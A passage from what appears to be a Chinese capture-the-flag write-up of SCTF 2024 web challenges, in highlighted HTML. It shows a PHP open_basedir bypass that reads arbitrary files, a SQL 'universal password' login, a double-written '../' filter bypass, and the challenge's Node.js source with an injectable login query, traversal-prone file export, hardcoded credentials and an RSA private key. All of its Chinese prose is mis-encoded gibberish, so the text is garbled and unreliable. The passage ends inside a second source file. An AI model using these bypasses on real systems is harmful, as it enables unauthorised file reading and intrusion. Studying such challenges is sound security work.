invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File contents: <span class="hljs-subst">$data</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/05/sctf-web-learning/image-20241005234147752.png" alt="image-20241005234147752"></p><p>è¿™ä¹Ÿèƒ½æƒ³åˆ°å•Šï¼Œæˆ‘è‰ã€‚</p><p>å­¦åˆ°ä¸€ä¸ªæ–°çš„ç»•disable_functionsæ–¹æ³•äº†ã€‚</p><h2 id="SycServer2-0"><a href="#SycServer2-0" class="headerlink" title="SycServer2.0"></a>SycServer2.0</h2><p>æ€ªé¢˜ï¼Œå‡ºæ™šäº†ã€‚</p><p>å‰ç«¯ç»•è¿‡å¾ˆç®€å•ï¼Œjsçš„wafå½¢åŒè™šè®¾ï¼Œåˆ äº†ç›´æ¥sqlä¸‡èƒ½å¯†ç è¿›äº†ï¼Œæ‹¿cookieã€‚</p><p>robots.txtå‘ç°ä¸€ä¸ªç©æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-agent: *<br>Disallow:<br>Disallow: /ExP0rtApi?v=<span class="hljs-built_in">static</span>&amp;f=<span class="hljs-number">1</span>.jpeg<br></code></pre></td></tr></table></figure><p>çŒœæµ‹è¿™æ˜¯ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„æ¥å£ï¼Œç»“æœè¿˜çœŸæ˜¯ï¼Œæ›¿æ¢<code>../</code>ä¸ºç©ºï¼ŒåŒå†™ç»•äº†ã€‚</p><p>ç„¶åå°±å¯ä»¥è¯»åˆ°app.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> nodeRsa = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-rsa&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SECRET_KEY</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> zlib = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;zlib&#x27;</span>);<br><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mysql&#x27;</span>)<br><span class="hljs-keyword">const</span> handle = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./handle&#x27;</span>);<br><span class="hljs-keyword">const</span> cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><br><span class="hljs-keyword">const</span> con = mysql.<span class="hljs-title function_">createConnection</span>(&#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;ctf&#x27;</span>,<br>  <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;ctf123123&#x27;</span>,<br>  <span class="hljs-attr">port</span>: <span class="hljs-string">&#x27;3306&#x27;</span>,<br>  <span class="hljs-attr">database</span>: <span class="hljs-string">&#x27;sctf&#x27;</span><br>&#125;)<br>con.<span class="hljs-title function_">connect</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error connecting to MySQL:&#x27;</span>, err.<span class="hljs-property">message</span>);<br>    <span class="hljs-built_in">setTimeout</span>(con.<span class="hljs-title function_">connect</span>(), <span class="hljs-number">2000</span>); <span class="hljs-comment">// 2Ã§Â§Â’Ã¥ÂÂÃ©Â‡ÂÃ¨Â¯Â•Ã¨Â¿ÂÃ¦ÂÂ¥</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MySQL&#x27;</span>);<br>  &#125;<br>&#125;);<br><br><span class="hljs-keyword">const</span> &#123;response&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> req = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express/lib/request&quot;</span>);<br><br><span class="hljs-keyword">var</span> key = <span class="hljs-keyword">new</span> <span class="hljs-title function_">nodeRsa</span>(&#123; <span class="hljs-attr">b</span>: <span class="hljs-number">1024</span> &#125;);<br>key.<span class="hljs-title function_">setOptions</span>(&#123; <span class="hljs-attr">encryptionScheme</span>: <span class="hljs-string">&#x27;pkcs1&#x27;</span> &#125;);<br><br><span class="hljs-keyword">var</span> publicPem = <span class="hljs-string">`-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----`</span>;<br><span class="hljs-keyword">var</span> privatePem = <span class="hljs-string">`-----BEGIN PRIVATE KEY-----</span><br><span class="hljs-string">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27</span><br><span class="hljs-string">PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l</span><br><span class="hljs-string">i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi</span><br><span class="hljs-string">6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI</span><br><span class="hljs-string">lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY</span><br><span class="hljs-string">Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61</span><br><span class="hljs-string">khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT</span><br><span class="hljs-string">6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78</span><br><span class="hljs-string">dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG</span><br><span class="hljs-string">mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye</span><br><span class="hljs-string">KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh</span><br><span class="hljs-string">UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l</span><br><span class="hljs-string">zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg</span><br><span class="hljs-string">xu/vfQ0A1jHRNC7t</span><br><span class="hljs-string">-----END PRIVATE KEY-----`</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;static&#x27;</span>)));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Reportcache</span> = &#123;&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyAdmin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>[<span class="hljs-string">&#x27;auth_token&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (!token) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;No token provided&#x27;</span> &#125;);<br>  &#125;<br><br>  jwt.<span class="hljs-title function_">verify</span>(token, <span class="hljs-variable constant_">SECRET_KEY</span>, <span class="hljs-function">(<span class="hljs-params">err, decoded</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Failed to authenticate token&#x27;</span> &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (decoded.<span class="hljs-property">role</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Access denied. Admins only.&#x27;</span> &#125;);<br>    &#125;<br><br>    req.<span class="hljs-property">user</span> = decoded;<br>    <span class="hljs-title function_">next</span>();<br>  &#125;);<br>&#125;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/hello&#x27;</span>, verifyAdmin ,<span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Welcome Admin!!!&lt;/h1&gt;&lt;br&gt;&lt;img src=&quot;./1.jpeg&quot; /&gt;&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/config&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">json</span>(&#123;<br>    <span class="hljs-attr">publicKey</span>: publicPem,<br>  &#125;);<br>&#125;);<br><br><span class="hljs-keyword">var</span> decrypt = <span class="hljs-keyword">function</span>(<span class="hljs-params">body</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">var</span> pem = privatePem;<br>    <span class="hljs-keyword">var</span> key = <span class="hljs-keyword">new</span> <span class="hljs-title function_">nodeRsa</span>(pem, &#123;<br>      <span class="hljs-attr">encryptionScheme</span>: <span class="hljs-string">&#x27;pkcs1&#x27;</span>,<br>      <span class="hljs-attr">b</span>: <span class="hljs-number">1024</span><br>    &#125;);<br>    key.<span class="hljs-title function_">setOptions</span>(&#123; <span class="hljs-attr">environment</span>: <span class="hljs-string">&quot;browser&quot;</span> &#125;);<br>    <span class="hljs-keyword">return</span> key.<span class="hljs-title function_">decrypt</span>(body, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;decrypt error&quot;</span>, e);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>&#125;;<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> encryptedPassword = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br>  <span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    passwd = <span class="hljs-title function_">decrypt</span>(encryptedPassword)<br>    <span class="hljs-keyword">if</span>(username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      <span class="hljs-keyword">const</span> sql = <span class="hljs-string">`select (select password from user where username = &#x27;admin&#x27;) = &#x27;<span class="hljs-subst">$&#123;passwd&#125;</span>&#x27;;`</span><br>      con.<span class="hljs-title function_">query</span>(sql, <span class="hljs-function">(<span class="hljs-params">err, rows</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(err.<span class="hljs-property">message</span>);<br>        <span class="hljs-keyword">if</span> (rows[<span class="hljs-number">0</span>][<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(rows[<span class="hljs-number">0</span>])]) &#123;<br>          <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123;username, <span class="hljs-attr">role</span>: username&#125;, <span class="hljs-variable constant_">SECRET_KEY</span>, &#123;<span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&#x27;1h&#x27;</span>&#125;);<br>          res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;auth_token&#x27;</span>, token, &#123;<span class="hljs-attr">secure</span>: <span class="hljs-literal">false</span>&#125;);<br>          res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Login Successfully&#x27;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Errow Password!&#x27;</span>&#125;);<br>        &#125;<br>      &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;This Website Only Open for admin&#x27;</span>&#125;);<br>    &#125;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Error decrypting password!&#x27;</span> &#125;);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/ExP0rtApi&#x27;</span>, verifyAdmin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> rootpath = req.<span class="hljs-property">query</span>.<span class="hljs-property">v</span>;<br>  <span class="hljs-keyword">var</span> file = req.<span class="hljs-property">query</span>.<span class="hljs-property">f</span>;<br><br>  file = file.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.\.\//g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>  rootpath = rootpath.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.\.\//g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>  <span class="hljs-keyword">if</span>(rootpath === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(file === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;try to find parameters HaHa&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      rootpath = <span class="hljs-string">&quot;static&quot;</span><br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> filePath = path.<span class="hljs-title function_">join</span>(__dirname, rootpath + <span class="hljs-string">&quot;/&quot;</span> + file);<br><br>  <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(filePath)) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;File not found&#x27;</span>);<br>  &#125;<br>  fs.<span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-function">(<span class="hljs-params">err, fileData</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error reading file:&#x27;</span>, err);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error reading file&#x27;</span>);<br>    &#125;<br><br>    zlib.<span class="hljs-title function_">gzip</span>(fileData, <span class="hljs-function">(<span class="hljs-params">err, compressedData</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (err) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error compressing file:&#x27;</span>, err);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error compressing file&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">const</span> base64Data = compressedData.<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>);<br>      res.<span class="hljs-title function_">send</span>(base64Data);<br>    &#125;);<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/report&quot;</span>, verifyAdmin ,<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&quot;/static/report_noway_dirsearch.html&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/report&quot;</span>, verifyAdmin ,<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Reportcache</span>[user] === <span class="hljs-literal">undefined</span>) &#123;<br>    <span class="hljs-title class_">Reportcache</span>[user] = &#123;&#125;;<br>  &#125;<br>  <span class="hljs-title class_">Reportcache</span>[user][date] = reportmessage<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/countreport&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> user <span class="hljs-keyword">in</span> <span class="hljs-title class_">Reportcache</span>) &#123;<br>    count += <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Reportcache</span>[user]).<span class="hljs-property">length</span>;<br>  &#125;<br>  res.<span class="hljs-title function_">json</span>(&#123; count &#125;);<br>&#125;);<br><br><span class="hljs-comment">//æŸ¥çœ‹å½“å‰è¿è¡Œç”¨æˆ·</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/VanZY_s_T3st&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> command = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>  <span class="hljs-keyword">const</span> cmd = cp.<span class="hljs-title function_">spawn</span>(command ,[]);<br>  cmd.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">end</span>(data.<span class="hljs-title function_">toString</span>());<br>  &#125;);<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>åˆšå¼€å§‹çŒœæµ‹æ˜¯æ‰“åŸå‹é“¾æ±¡æŸ“child_progressï¼Œä½†æ˜¯è¯»åˆ°è¿™ä¸ªNodeæœ€æ–°ç‰ˆæœ¬ç®—æ˜¯ï¼Œæ²¡è¾™ã€‚</p><p>æœ¬åœ°èµ·ä¸€ä¸ªè¿™ä¸ªç©æ„è¿˜æŠ¥é”™äº†handleæ‰¾ä¸åˆ°ï¼ŒçŒœæµ‹ä»–è¿˜æœ‰handleé‡Œçš„ä¸œè¥¿ï¼Œç»“æœçœŸæœ‰ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// /app/handle/index.js</span><br><br><span class="hljs-keyword">var</span> ritm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;require-in-the-middle&#x27;</span>);<br><span class="hljs-keyword">var</span> patchChildProcess = <span 